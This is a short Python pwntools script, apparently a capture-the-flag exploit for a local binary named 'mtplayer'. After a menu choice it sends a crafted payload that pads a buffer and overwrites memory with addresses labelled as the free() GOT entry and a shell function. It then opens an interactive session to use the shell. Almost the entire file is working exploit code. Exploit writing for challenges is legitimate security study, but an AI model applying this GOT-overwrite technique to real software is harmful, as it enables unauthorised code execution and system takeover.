#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports
import time
from pwn import *

p = process("./mtplayer")

p.recvuntil("human)\n")

p.sendline("1")

temp = "  0|" * 15 + "\n"
data = p.recvuntil(temp)
print data
time.sleep(0.5)

target = 0x60b030 #free
shell = 0x402800
empty = 0x60b300

wait("me")

pay = "kkjjhlhlBABA123" 
payload = pay.ljust(0x1000, "\x00") + p64(0) * 3 + p64(0x3000) + p64(0) * 4 + p32(0) * 4 + p32(1) * 6  + p64(target) + p64(empty) * 2 + p64(target) * 3 + "\n"

p.send(payload)

print p.recv()


p.interactive()

